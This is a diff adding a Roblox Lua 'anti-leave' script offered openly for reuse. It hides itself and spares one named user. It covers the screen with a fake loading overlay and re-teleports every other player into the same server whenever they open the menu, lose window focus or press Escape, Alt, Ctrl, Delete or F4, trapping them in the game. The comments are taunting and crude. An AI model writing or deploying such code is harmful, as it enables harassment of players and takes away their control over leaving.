@@ -1,0 +1,175 @@
+--name local script to this btw
+
+wait()
+script.Parent = nil
+
+-- enjoy skidding this :D --
+
+
+
+
+
+pcall(function()
+	game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
+end)
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+if LocalPlayer.Name == script.user.Value then 
+	game:GetService("StarterGui"):SetCore("SendNotification",{
+		Title = "some shitty anti-leave",
+		Text = "loaded lol",
+		Duration = 3
+	})
+	return 
+end
+
+local TPServ = game:GetService("TeleportService")
+local GuiServ = game:GetService("GuiService")
+local UIS = game:GetService("UserInputService")
+
+local ucantleavebitch = Instance.new("ScreenGui")
+local ImageLabel = Instance.new("ImageLabel")
+local LoadingFrame = Instance.new("Frame")
+local Frame = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local PercentageBar = Instance.new("ImageLabel")
+local Label = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+
+--Properties:
+
+ucantleavebitch.Parent = LocalPlayer.PlayerGui
+ucantleavebitch.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ucantleavebitch.DisplayOrder = 2147483647
+
+ImageLabel.Parent = ucantleavebitch
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=0" --what ever image you want like ICC or wtv be creative nerd
+LoadingFrame.Name = "LoadingFrame"
+LoadingFrame.Parent = ucantleavebitch
+LoadingFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+LoadingFrame.BorderSizePixel = 0
+LoadingFrame.Position = UDim2.new(-0.000821621623, 0, 0.814750969, 0)
+LoadingFrame.Size = UDim2.new(0.338442117, 0, 0.19506079, 0)
+
+Frame.Name = "Frame"
+Frame.Parent = LoadingFrame
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 1.000
+Frame.Position = UDim2.new(-0.204075292, 0, -0.198473275, 0)
+Frame.Size = UDim2.new(0.525885582, 0, 0.368852466, 0)
+Frame.Image = "rbxassetid://3570695787"
+Frame.ImageColor3 = Color3.fromRGB(35, 35, 35)
+Frame.ScaleType = Enum.ScaleType.Slice
+Frame.SliceCenter = Rect.new(100, 100, 100, 100)
+Frame.SliceScale = 0.120
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.383419693, 0, 0, 0)
+TextLabel.Size = UDim2.new(0.616580307, 0, 0.577777803, 0)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Loading..."
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+PercentageBar.Name = "PercentageBar"
+PercentageBar.Parent = LoadingFrame
+PercentageBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PercentageBar.BackgroundTransparency = 1.000
+PercentageBar.Position = UDim2.new(0.0326975472, 0, 0.577336967, 0)
+PercentageBar.Size = UDim2.new(0.934604824, 0, 0.295081973, 0)
+PercentageBar.Image = "rbxassetid://3570695787"
+PercentageBar.ImageColor3 = Color3.fromRGB(0, 145, 255)
+PercentageBar.ScaleType = Enum.ScaleType.Slice
+PercentageBar.SliceCenter = Rect.new(100, 100, 100, 100)
+PercentageBar.SliceScale = 0.120
+
+Label.Name = "Label"
+Label.Parent = PercentageBar
+Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Label.BackgroundTransparency = 1.000
+Label.Size = UDim2.new(1, 0, 1, 0)
+Label.Font = Enum.Font.SourceSans
+Label.Text = "100%"
+Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+Label.TextScaled = true
+Label.TextSize = 14.000
+Label.TextWrapped = true
+
+TextLabel_2.Parent = ucantleavebitch
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(-0.00198846636, 0, 0.846784174, 0)
+TextLabel_2.Size = UDim2.new(0.339608967, 0, 0.0428137034, 0)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Now joining _________ realm.." --put your username or wtv
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+TextLabel_3.Parent = ucantleavebitch
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.0562912859, 0, 0.899411678, 0)
+TextLabel_3.Size = UDim2.new(0.223557532, 0, 0.0245394632, 0)
+TextLabel_3.Font = Enum.Font.SourceSansItalic
+TextLabel_3.Text = "_____________________" --wtv you want the thing to say below the "now joining _____ realm"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+ucantleavebitch.Parent = game:GetService("HeightmapImporterService")
+
+
+function RejoinLol()
+	TPServ:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer)
+end
+
+TPServ:SetTeleportGui(ucantleavebitch)
+
+GuiServ.MenuOpened:Connect(function()
+	RejoinLol()
+end)
+
+UIS.WindowFocusReleased:Connect(function()
+	RejoinLol()
+end)
+
+if GuiServ.MenuIsOpen then
+	RejoinLol()
+end
+
+game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
+	if input.UserInputType == Enum.UserInputType.Keyboard then
+		if input.KeyCode == Enum.KeyCode.LeftAlt then
+			RejoinLol()
+		elseif input.KeyCode == Enum.KeyCode.RightAlt then
+			RejoinLol()
+		elseif input.KeyCode == Enum.KeyCode.RightSuper then
+			RejoinLol()
+		elseif input.KeyCode == Enum.KeyCode.LeftSuper then
+			RejoinLol()
+		elseif input.KeyCode == Enum.KeyCode.Delete then
+			RejoinLol()
+		elseif input.KeyCode == Enum.KeyCode.Escape then
+			RejoinLol()
+		elseif input.KeyCode == Enum.KeyCode.ButtonStart then
+			RejoinLol()
+		elseif input.KeyCode == Enum.KeyCode.F4 then
+			RejoinLol()
+		elseif input.KeyCode == Enum.KeyCode.LeftControl then
+			RejoinLol()
+		elseif input.KeyCode == Enum.KeyCode.RightControl then
+			RejoinLol()
+		end	
+	end
+end)
